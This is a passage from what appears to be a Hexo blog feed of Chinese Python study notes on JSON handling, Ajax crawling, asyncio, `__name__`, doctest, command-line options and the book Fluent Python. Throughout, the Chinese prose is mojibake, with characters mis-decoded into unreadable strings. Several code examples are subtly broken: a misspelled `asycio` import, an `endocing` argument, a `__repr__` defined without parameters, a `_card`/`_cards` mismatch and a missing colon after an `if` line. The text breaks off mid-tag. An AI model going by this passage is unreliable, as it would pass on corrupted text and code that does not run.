æ–¹æ³•ï¼Œå°† JSON å¯¹è±¡è½¬åŒ–ä¸ºæ–‡æœ¬å­—ç¬¦ä¸²ã€‚</p><p>è·å–é”®å€¼çš„æ–¹æ³•æœ‰ä¸¤ç§:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">data<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;name&#x27;</span>]</span><br>data<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.get</span>(<span class="hljs-string">&#x27;name&#x27;</span>)<br></code></pre></td></tr></table></figure><p><code>get</code> æ–¹æ³•ä¹Ÿå¯ä¼ å…¥ç¬¬äºŒä¸ªå‚æ•°ï¼Œå…¶ä¸ºä¸å­˜åœ¨é”®åæ—¶è¿”å›çš„å€¼ã€‚</p><p>JSON çš„æ•°æ®éœ€è¦ç”¨åŒå¼•å·åŒ…è£¹è€Œä¸æ˜¯å•å¼•å·ã€‚</p><p><code>load</code> æ–¹æ³•çš„å‚æ•°æ˜¯ä¸€ä¸ªæ–‡æœ¬æ“ä½œå¯¹è±¡:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br><br>data = <span class="hljs-type">json</span>.<span class="hljs-keyword">load</span>(<span class="hljs-keyword">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>print(data)<br></code></pre></td></tr></table></figure><h3 id="è¾“å‡º-JSON"><a href="#è¾“å‡º-JSON" class="headerlink" title="è¾“å‡º JSON"></a>è¾“å‡º JSON</h3><p>å¦‚æœæƒ³ä¿å­˜ JSON å¯¹è±¡çš„ç¼©è¿›æ ¼å¼ï¼Œå¾€ dumps æ–¹æ³•ä¸­æ·»åŠ  <code>indent</code> å‚æ•°ï¼Œä»£è¡¨ç¼©è¿›å­—ç¬¦çš„ä¸ªæ•°ã€‚</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>     <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(json.dumps(data, indent=<span class="hljs-number">2</span>))<br></code></pre></td></tr></table></figure><p>è¦æƒ³è¾“å‡ºä¸­æ–‡ï¼Œéœ€æŒ‡å®šå‚æ•° <code>ensure_ascii</code> ä¸º <code>False</code>:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:<br>     <span class="hljs-built_in">file</span>.<span class="hljs-built_in">write</span>(json.dumps(data, indent=<span class="hljs-number">2</span>, ensure_ascii=False))<br></code></pre></td></tr></table></figure><p>ä¹Ÿæœ‰ <code>dump</code> æ–¹æ³•:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">json.dump(data, open(<span class="hljs-string">&#x27;data.json&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>, <span class="hljs-attribute">endocing</span>=<span class="hljs-string">&#x27;utf-8&#x27;</span>), <span class="hljs-attribute">indent</span>=2, <span class="hljs-attribute">ensure_ascii</span>=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h2 id="4-4-MySQL-å­˜å‚¨"><a href="#4-4-MySQL-å­˜å‚¨" class="headerlink" title="4.4 MySQL å­˜å‚¨"></a>4.4 MySQL å­˜å‚¨</h2><p>ä½¿ç”¨ PyMySQL åº“æ“ä½œ MySQL æ•°æ®åº“ã€‚</p><h1 id="ç¬¬5ç« -Ajax-æ•°æ®çˆ¬å–"><a href="#ç¬¬5ç« -Ajax-æ•°æ®çˆ¬å–" class="headerlink" title="ç¬¬5ç«  Ajax æ•°æ®çˆ¬å–"></a>ç¬¬5ç«  Ajax æ•°æ®çˆ¬å–</h1><p>Ajax çš„å…¨ç§°ä¸º Asynchronous JavaScript and XML, å³å¼‚æ­¥çš„ JavaScript å’Œ XML.</p><p>å¦‚: é¡µé¢ä¸‹æ»‘æ—¶æ…¢æ…¢åŠ è½½å°±æ˜¯åœ¨å‘ Ajax è·å–æ•°æ®ã€‚</p><h2 id="5-1-åŸºæœ¬åŸç†"><a href="#5-1-åŸºæœ¬åŸç†" class="headerlink" title="5.1 åŸºæœ¬åŸç†"></a>5.1 åŸºæœ¬åŸç†</h2><p>åˆ†ä¸ºä¸‰æ­¥:</p><ul><li>å‘é€è¯·æ±‚</li><li>è§£æå†…å®¹</li><li>æ¸²æŸ“é¡µé¢</li></ul><p>Ajax æ˜¯ç”± JavaScript å®ç°çš„ã€‚</p><h2 id="5-2-Ajax-åˆ†ææ–¹æ³•"><a href="#5-2-Ajax-åˆ†ææ–¹æ³•" class="headerlink" title="5.2 Ajax åˆ†ææ–¹æ³•"></a>5.2 Ajax åˆ†ææ–¹æ³•</h2><p>Ajax æœ‰å…¶ç‹¬ç‰¹çš„è¯·æ±‚ç±»å‹ï¼Œå«åš <code>xhr</code></p><h2 id="5-3-Ajax-åˆ†æä¸çˆ¬å–å®æˆ˜"><a href="#5-3-Ajax-åˆ†æä¸çˆ¬å–å®æˆ˜" class="headerlink" title="5.3 Ajax åˆ†æä¸çˆ¬å–å®æˆ˜"></a>5.3 Ajax åˆ†æä¸çˆ¬å–å®æˆ˜</h2><p>åœ¨ HTML ä¸­ï¼Œåªèƒ½çœ‹åˆ°æºç å¼•ç”¨çš„ä¸€äº› JavaScript å’Œ CSS æ–‡ä»¶ï¼Œå¹¶æ²¡æœ‰è§‚å¯Ÿåˆ°å…¶ä»–æœ‰ç”¨ä¿¡æ¯ï¼Œè¯´æ˜å…¶åœ¨åå°è°ƒç”¨äº† Ajax æ¥å£ã€‚</p><p>å­—å…¸ä¸­çš„ <code>get()</code> åˆ©ç”¨é”®æ¥è·å–å€¼ã€‚</p><h1 id="ç¬¬6ç« -å¼‚æ­¥çˆ¬è™«"><a href="#ç¬¬6ç« -å¼‚æ­¥çˆ¬è™«" class="headerlink" title="ç¬¬6ç«  å¼‚æ­¥çˆ¬è™«"></a>ç¬¬6ç«  å¼‚æ­¥çˆ¬è™«</h1><h2 id="6-1-åç¨‹çš„åŸºæœ¬åŸç†"><a href="#6-1-åç¨‹çš„åŸºæœ¬åŸç†" class="headerlink" title="6.1 åç¨‹çš„åŸºæœ¬åŸç†"></a>6.1 åç¨‹çš„åŸºæœ¬åŸç†</h2><h3 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h3><p>åç¨‹(coroutine), æ˜¯ä¸€ç§è¿è¡Œåœ¨ç”¨æˆ·æ€çš„è½»é‡çº§çº¿ç¨‹ã€‚å…¶æ‹¥æœ‰è‡ªå·±çš„å¯„å­˜å™¨å’Œä¸Šä¸‹æ–‡ã€‚</p><h3 id="asyncio-åº“ç”¨æ³•"><a href="#asyncio-åº“ç”¨æ³•" class="headerlink" title="asyncio åº“ç”¨æ³•"></a>asyncio åº“ç”¨æ³•</h3><p>å‡ ä¸ªæ¦‚å¿µ:</p><ul><li>event_loop: äº‹ä»¶å¾ªç¯ï¼Œç›¸å½“äºæ— é™å¾ªç¯ï¼Œå¯å°†å‡½æ•°æ³¨å†Œåœ¨å…¶ä¸Šï¼Œå½“æ»¡è¶³æ¡ä»¶æ—¶è°ƒç”¨</li><li>coroutine: Python ä¸­æŒ‡ä»£åç¨‹å¯¹è±¡ç±»å‹ï¼Œå¯å°†å…¶æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ä¸Š</li><li>task: ä»»åŠ¡ï¼Œå¯¹åç¨‹å¯¹è±¡çš„åŒ…è£…</li><li>future: ä»£è¡¨å°†æ¥æ‰§è¡Œæˆ–æ²¡æœ‰æ‰§è¡Œçš„ä»»åŠ¡çš„ç»“æœï¼Œæœ¬è´¨ä¸ŠåŒ task</li></ul><h4 id="å®šä¹‰åç¨‹"><a href="#å®šä¹‰åç¨‹" class="headerlink" title="å®šä¹‰åç¨‹"></a>å®šä¹‰åç¨‹</h4><p><code>async</code> å…³é”®å­—ï¼Œç”¨äºå®šä¹‰ä¸€ä¸ªæ–¹æ³•, å…¶ä¸ºä¸€ä¸ªæ— æ³•ç›´æ¥æ‰§è¡Œçš„åç¨‹å¯¹è±¡ï¼Œå¿…é¡»å°†æ­¤å¯¹è±¡æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ä¸­æ‰å¯ä»¥æ‰§è¡Œã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs lua">import asycio<br><br>async def <span class="hljs-built_in">execute</span>(x):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Number:&#x27;</span>, x)<br><br><span class="hljs-built_in">coroutine</span> = <span class="hljs-built_in">execute</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Coroutine:&#x27;</span>, <span class="hljs-built_in">coroutine</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;After calling execute&#x27;</span>)<br><br>loop = asyncio.get_event_loop()<br>loop.run_until_complete(<span class="hljs-built_in">coroutine</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;After calling loop&#x27;</span>)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ <code>get_event_loop()</code> æ–¹æ³•åˆ›å»ºäº†ä¸€ä¸ªäº‹ä»¶å¾ªç¯, å³å…¶è¿”å›å€¼æ˜¯ä¸€ä¸ªäº‹ä»¶å¾ªç¯ã€‚</p><p><code>run_until_complete()</code> æ–¹æ³•å°†åç¨‹å¯¹è±¡æ³¨å†Œåˆ°äº‹ä»¶å¾ªç¯ä¸­. ä¹Ÿå°±æ˜¯æ‰§è¡Œã€‚å…¶åœ¨å†…éƒ¨éšå¼å°†åç¨‹å¯¹è±¡å˜ä¸º task.</p><p>æ˜¾å¼å°†åç¨‹å¯¹è±¡å°è£…ä¸ºtask:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">task</span> <span class="hljs-operator">=</span> loop.create_task(coroutine)<br></code></pre></td></tr></table></figure><p>å¦å¤–å®šä¹‰ task çš„æ–¹æ³•, ä½¿ç”¨ asyncio åŒ…çš„ <code>ensure_future</code> æ–¹æ³•:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">task</span> <span class="hljs-operator">=</span> asyncio.ensure_future(coroutine)<br></code></pre></td></tr></table></figure><h4 id="ç»‘å®š-callback"><a href="#ç»‘å®š-callback" class="headerlink" title="ç»‘å®š callback"></a>ç»‘å®š callback</h4><p>å³åœ¨ task å®Œæˆæ—¶å°±ä¼šè°ƒç”¨çš„æ–¹æ³•, ä½¿ç”¨ task å¯¹è±¡çš„ <code>add_done_callback()</code> æ–¹æ³•:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">  <br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python ä¸­ if __name__ == &#39;__main__&#39; ç†è§£</title>
    <link href="/2022/08/22/Python-%E4%B8%AD-if-name-main-%E7%90%86%E8%A7%A3/"/>
    <url>/2022/08/22/Python-%E4%B8%AD-if-name-main-%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="ä½œç”¨"><a href="#ä½œç”¨" class="headerlink" title="ä½œç”¨"></a>ä½œç”¨</h1><p>å¯ä»¥ç”¨æ¥æ£€æŸ¥æ˜¯å¦åœ¨è¿è¡Œè‡ªå·±ã€‚</p><p><code>if __name__ == &#39;__main__&#39;:</code> åªæœ‰åœ¨ä»£ç ä½œä¸ºè„šæœ¬ç›´æ¥è¿è¡Œæ—¶æ‰ä¼šè¢«æ‰§è¡Œï¼Œè€Œ <code>import</code> åˆ°å…¶ä»–è„šæœ¬ä¸­æ˜¯ä¸ä¼šè¢«æ‰§è¡Œçš„ã€‚</p><p>å¦‚:</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-string">&#x27;test&#x27;</span>)</span><br></code></pre></td></tr></table></figure><h1 id="è¿è¡ŒåŸç†"><a href="#è¿è¡ŒåŸç†" class="headerlink" title="è¿è¡ŒåŸç†"></a>è¿è¡ŒåŸç†</h1><p>æ¯ä¸ª Python æ¨¡å—(å³ Python æ–‡ä»¶) éƒ½åŒ…å«å†…ç½®å˜é‡ <code>__name__</code>, å½“æ¨¡å—è¢«ç›´æ¥æ‰§è¡Œæ—¶ï¼Œå…¶å€¼ç­‰äº <code>__main__</code>.</p><p>è€Œè¢« <code>import</code> æ—¶ï¼Œå…¶å€¼ä¸ºæ–‡ä»¶å.</p><h1 id="ç¨‹åºå…¥å£"><a href="#ç¨‹åºå…¥å£" class="headerlink" title="ç¨‹åºå…¥å£"></a>ç¨‹åºå…¥å£</h1><p><code>if __name__ == &#39;__main__&#39;:</code> å¯ä»¥æ¨¡æ‹Ÿç¨‹åºçš„å…¥å£ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python æ¨¡å— doctest</title>
    <link href="/2022/08/22/Python-%E6%A8%A1%E5%9D%97-doctest/"/>
    <url>/2022/08/22/Python-%E6%A8%A1%E5%9D%97-doctest/</url>
    
    <content type="html"><![CDATA[<h1 id="doctest-â€“-Test-interactive-Python-examples"><a href="#doctest-â€“-Test-interactive-Python-examples" class="headerlink" title="doctest â€“ Test interactive Python examples"></a>doctest â€“ Test interactive Python examples</h1><p><code>doctest</code> æ¨¡å—ä¼šå¯»æ‰¾<code>&gt;&gt;&gt;</code>ç„¶åæ‰§è¡Œï¼Œåˆ¤æ–­æ˜¯å¦æ­£å¸¸å·¥ä½œã€‚</p><p>å¯ç”¨äºæµ‹è¯• <code>docstring</code> æ˜¯å¦ up-to-date.</p><p>ä½¿ç”¨å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> example.<span class="hljs-keyword">py</span> -v<br></code></pre></td></tr></table></figure><p>å‰ææ˜¯è¦æœ‰å¦‚ä¸‹ä»£ç :</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">if __name__ <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-string">&quot;__main__&quot;</span><br>  import doctest<br>  doctest.testmod()<br></code></pre></td></tr></table></figure><p>å¦ä¸€ç§æ–¹æ³•è°ƒç”¨å¯ä»¥ä¸ç”¨å†™ä¸Šè¿°ä»£ç :</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest -v example.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python çš„éƒ¨åˆ†å‘½ä»¤è¡Œé€‰é¡¹</title>
    <link href="/2022/08/22/Python-%E7%9A%84%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9/"/>
    <url>/2022/08/22/Python-%E7%9A%84%E9%83%A8%E5%88%86%E5%91%BD%E4%BB%A4%E8%A1%8C%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<h1 id="c-é€‰é¡¹"><a href="#c-é€‰é¡¹" class="headerlink" title="-c é€‰é¡¹"></a><code>-c</code> é€‰é¡¹</h1><p>åº”è¯¥æ„ä¸º code.</p><p>åé¢è·Ÿä¸€æ®µ Python ä»£ç ã€‚</p><p>å¦‚:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -c <span class="hljs-string">&quot;print(&#x27;hello world&#x27;)&quot;</span><br></code></pre></td></tr></table></figure><p>è‹¥è¦å¤šè¡Œä»£ç , ä½¿ç”¨ä¸‰ä¸ªå•å¼•å·<code>&#39;&#39;&#39;</code>:</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">python3 -c &#x27;&#x27;&#x27;<br>&gt;print(1)<br>&gt;print(2)<br>&#x27;&#x27;&#x27;<br></code></pre></td></tr></table></figure><h1 id="m-é€‰é¡¹"><a href="#m-é€‰é¡¹" class="headerlink" title="-m é€‰é¡¹"></a><code>-m</code> é€‰é¡¹</h1><p>åº”è¯¥æ„ä¸º module.</p><p>åé¢è·Ÿä¸€ä¸ª Python æ¨¡å—</p><h1 id="i-é€‰é¡¹"><a href="#i-é€‰é¡¹" class="headerlink" title="-i é€‰é¡¹"></a><code>-i</code> é€‰é¡¹</h1><p>åº”è¯¥æ„ä¸º interactivity.<br>å½“ä¸€ä¸ªè„šæœ¬ä¼ å…¥æˆ–è€…ä½¿ç”¨ <code>-c</code> é€‰é¡¹æ—¶ï¼Œæ‰§è¡Œåè¿›å…¥äº¤äº’æ¨¡å¼ï¼Œå³æ‰§è¡Œå®Œè„šæœ¬åå°±å¼€å§‹<code>&gt;&gt;&gt;</code>:</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> -i -c <span class="hljs-string">&quot;print(1)&quot;</span><br><span class="hljs-number">1</span><br>&gt;&gt;&gt;<br></code></pre></td></tr></table></figure><h1 id="q-é€‰é¡¹"><a href="#q-é€‰é¡¹" class="headerlink" title="-q é€‰é¡¹"></a><code>-q</code> é€‰é¡¹</h1><p>åº”è¯¥æ„ä¸º quiet.</p><p>ä¸æ˜¾ç¤ºç‰ˆæƒå’Œç‰ˆæœ¬ä¿¡æ¯.</p><h1 id="W-é€‰é¡¹"><a href="#W-é€‰é¡¹" class="headerlink" title="-W é€‰é¡¹"></a><code>-W</code> é€‰é¡¹</h1><p>åº”è¯¥æ„ä¸º Warn.</p><p>åŒ…æ‹¬:</p><ul><li>-Wdefault</li><li>-Werror</li><li>-Walways</li><li>-Wmodule</li><li>-Wonce</li><li>-Wignore</li></ul>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æµç•…çš„Python</title>
    <link href="/2022/08/22/%E6%B5%81%E7%95%85%E7%9A%84Python/"/>
    <url>/2022/08/22/%E6%B5%81%E7%95%85%E7%9A%84Python/</url>
    
    <content type="html"><![CDATA[<p><code>doctest</code>æ˜¯ Python çš„ä¸€ä¸ªæ ‡å‡†åº“ï¼Œç”¨æ¥æµ‹è¯•ï¼Œé€šè¿‡æ¨¡æ‹Ÿæ§åˆ¶å°å¯¹è¯æ¥æ£€éªŒè¡¨è¾¾å¼æ±‚å€¼æ˜¯å¦æ­£ç¡®ã€‚</p><p>å¦‚:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> doctest example_script.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure><h1 id="ç¬¬ä¸€éƒ¨åˆ†-åºå¹•"><a href="#ç¬¬ä¸€éƒ¨åˆ†-åºå¹•" class="headerlink" title="ç¬¬ä¸€éƒ¨åˆ† åºå¹•"></a>ç¬¬ä¸€éƒ¨åˆ† åºå¹•</h1><h2 id="ç¬¬ä¸€ç« -Python-æ•°æ®æ¨¡å‹"><a href="#ç¬¬ä¸€ç« -Python-æ•°æ®æ¨¡å‹" class="headerlink" title="ç¬¬ä¸€ç«  Python æ•°æ®æ¨¡å‹"></a>ç¬¬ä¸€ç«  Python æ•°æ®æ¨¡å‹</h2><h3 id="1-1-ä¸€æ‘-Python-é£æ ¼çš„çº¸ç‰Œ"><a href="#1-1-ä¸€æ‘-Python-é£æ ¼çš„çº¸ç‰Œ" class="headerlink" title="1.1 ä¸€æ‘ Python é£æ ¼çš„çº¸ç‰Œ"></a>1.1 ä¸€æ‘ Python é£æ ¼çš„çº¸ç‰Œ</h3><p>ç‰¹æ®Šæ–¹æ³• <code>__len__</code> å’Œ <code>__getitem</code>.</p><p><code>__len__</code> æ”¯æŒ <code>len()</code> æ“ä½œ:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__len__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>  <span class="hljs-keyword">return</span> len(<span class="hljs-variable language_">self</span>._cards)<br></code></pre></td></tr></table></figure><p><code>__getitem__</code> æ”¯æŒ <code>card[]</code> è¿™æ ·çš„æ•°ç»„æ“ä½œ:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__getitem__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, position</span>):<br>  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>._card[position]<br></code></pre></td></tr></table></figure><h3 id="1-2-å¦‚ä½•ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•"><a href="#1-2-å¦‚ä½•ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•" class="headerlink" title="1.2 å¦‚ä½•ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•"></a>1.2 å¦‚ä½•ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•</h3><p>ç‰¹æ®Šæ–¹æ³•çš„å­˜åœ¨æ˜¯ä¸ºäº†è¢« Python è§£é‡Šå™¨è°ƒç”¨çš„ï¼Œä½ è‡ªå·±å¹¶ä¸éœ€è¦è°ƒç”¨ä»–ä»¬ã€‚</p><p><code>PyVarObject</code> æ˜¯è¡¨ç¤ºå†…å­˜ä¸­é•¿åº¦å¯å˜çš„å†…ç½®å¯¹è±¡çš„ C è¯­è¨€ç»“æ„ä½“ã€‚</p><p>ç‰¹æ®Šæ–¹æ³•çš„è°ƒç”¨æ˜¯éšå¼çš„ï¼Œå¦‚ <code>for i in x:</code> è¯­å¥ï¼ŒèƒŒåå…¶å®ç”¨çš„æ˜¯ <code>iter(x)</code>, è€Œè¿™ä¸ªå‡½æ•°çš„èƒŒååˆ™æ˜¯ <code>x.__iter__()</code> æ–¹æ³•ã€‚</p><p>é€šè¿‡å†…ç½®çš„å‡½æ•°(å¦‚ lenã€iterã€str, ç­‰) æ¥ä½¿ç”¨ç‰¹æ®Šæ–¹æ³•æ˜¯æœ€å¥½çš„é€‰æ‹©ã€‚</p><p>ä¸è¦éšæ„æ·»åŠ ç‰¹æ®Šæ–¹æ³•ã€‚</p><h4 id="1-2-1-æ¨¡æ‹Ÿæ•°å€¼ç±»å‹"><a href="#1-2-1-æ¨¡æ‹Ÿæ•°å€¼ç±»å‹" class="headerlink" title="1.2.1 æ¨¡æ‹Ÿæ•°å€¼ç±»å‹"></a>1.2.1 æ¨¡æ‹Ÿæ•°å€¼ç±»å‹</h4><p>åˆ©ç”¨ç‰¹æ®Šæ–¹æ³•ï¼Œå¯ä»¥è®©è‡ªå®šä¹‰å¯¹è±¡é€šè¿‡åŠ å·ç­‰è¿ç®—ç¬¦è¿›è¡Œè¿ç®—ã€‚</p><p>ç‰¹æ®Šæ–¹æ³• <code>__repr__</code>ã€<code>__abs__</code>ã€<code>__add__</code>ã€<code>__mul__</code> å®ç°å‘é‡ç±»:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> hypot<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, x=<span class="hljs-number">0</span>, y=<span class="hljs-number">0</span></span>):<br>        self.x = x<br>        self.y = y<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Vector(%r, %r)&#x27;</span> % (self.x, self.y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__abs__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> hypot(self.x, self.y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__bool__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(<span class="hljs-built_in">abs</span>(self))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params">self, other</span>):<br>        x = self.x + other.x<br>        y = self.y + other.y<br>        <span class="hljs-keyword">return</span> Vector(x, y)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params">self, scalar</span>):<br>        <span class="hljs-keyword">return</span> Vector(self.x * scalar, self.y * scalar)<br></code></pre></td></tr></table></figure><h4 id="1-2-2-å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼"><a href="#1-2-2-å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼" class="headerlink" title="1.2.2 å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼"></a>1.2.2 å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼</h4><p>Python çš„ä¸€ä¸ªå†…ç½®å‡½æ•°å« <code>repr</code>(æ„Ÿè§‰ä¸º representation), å…¶å°†ä¸€ä¸ªå¯¹è±¡ç”¨å­—ç¬¦ä¸²çš„å½¢å¼è¡¨è¾¾å‡ºæ¥ï¼Œä¹Ÿå°±æ˜¯â€å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼â€. å…¶åˆ©ç”¨çš„æ˜¯ <code>__repr__</code> ç‰¹æ®Šæ–¹æ³•ã€‚</p><p>ä½¿ç”¨ <code>%r</code> æ¥è·å–å¯¹è±¡å„ä¸ªå±æ€§çš„æ ‡å‡†å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚</p><p><code>__repr__</code> å’Œ <code>__str__</code> çš„åŒºåˆ«åœ¨äºï¼Œåè€…æ˜¯åœ¨ <code>str()</code> å‡½æ•°è¢«ä½¿ç”¨ï¼Œæˆ–æ˜¯åœ¨ <code>print</code> å‡½æ•°æ‰“å°ä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™æ‰è¢«è°ƒç”¨ã€‚<br><a href="http://stackoverflow.com/questions/1436703/difference-between-str-and-repr-in-python">difference between <strong>str</strong> and <strong>repr</strong> in Python</a></p><h4 id="1-2-3-ç®—æœ¯è¿ç®—ç¬¦"><a href="#1-2-3-ç®—æœ¯è¿ç®—ç¬¦" class="headerlink" title="1.2.3 ç®—æœ¯è¿ç®—ç¬¦"></a>1.2.3 ç®—æœ¯è¿ç®—ç¬¦</h4><p>é€šè¿‡ <code>__add__</code> å’Œ <code>__mul__</code>.</p><h4 id="1-2-4-è‡ªå®šä¹‰çš„å¸ƒå°”å€¼"><a 